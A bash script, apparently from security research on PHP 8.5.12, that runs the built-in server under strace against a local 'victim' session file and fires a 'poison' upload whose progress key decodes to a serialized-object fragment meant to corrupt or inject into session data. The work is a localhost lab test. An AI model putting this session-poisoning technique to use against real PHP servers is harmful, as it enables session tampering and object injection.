#!/bin/bash
# wp2_strace.sh - exact file-op ordering of the invalid-key reject path (angle 2)
# runs plain2 (8.5.12 -g) built-in server under strace, fires one T4 poison upload
CL=$(cd "$(dirname "$0")" && pwd)
ART=/tmp/p2s_c2
DIR=$ART/strace
SESS=$DIR/sess
PORT=${PORT:-18801}
SID=vicsid00000000000000000000000
PHPBIN=/tmp/php8512_build/plain2/sapi/cli/php

rm -rf "$DIR"; mkdir -p "$SESS"
cat > "$DIR/php.ini" <<EOF
session.save_handler = files
session.save_path = "$SESS"
session.serialize_handler = php
session.use_strict_mode = 0
session.upload_progress.enabled = 1
session.upload_progress.prefix = "upload_progress_"
session.upload_progress.freq = 1
session.upload_progress.min_freq = 0
session.upload_progress.cleanup = 1
session.gc_probability = 0
display_errors = 1
log_errors = 1
error_reporting = E_ALL
post_max_size = 64M
upload_max_filesize = 64M
memory_limit = 1024M
EOF

printf 'pref|s:6:"keepme";' > "$SESS/sess_$SID"
echo "victim before: $(stat -c %s "$SESS/sess_$SID") bytes"

strace -f -o "$DIR/trace.log" -e trace=openat,ftruncate,pwrite64,write,unlink,unlinkat,read,flock \
  "$PHPBIN" -c "$DIR/php.ini" -S 127.0.0.1:$PORT -t "$CL/docroot" \
  > "$DIR/server_out.log" 2> "$DIR/server_err.log" &
SPID=$!
for i in $(seq 1 100); do
  curl -s -o /dev/null --max-time 1 "http://127.0.0.1:$PORT/up.php" && break
  sleep 0.1
done

python3 "$CL/wp2_upclient.py" $PORT full $SID --key 4162637C4F3A3130 --filesize 8192 > "$DIR/client.log" 2>&1
sleep 0.5
kill $SPID 2>/dev/null; wait $SPID 2>/dev/null
echo "victim after: $(stat -c %s "$SESS/sess_$SID" 2>/dev/null || echo missing) bytes"
echo "--- session-file syscalls (chronological) ---"
grep -n "sess_$SID" "$DIR/trace.log" | head -60
echo "--- warnings ---"
grep -c "invalid key" "$DIR/server_err.log" "$DIR/server_out.log" 2>/dev/null
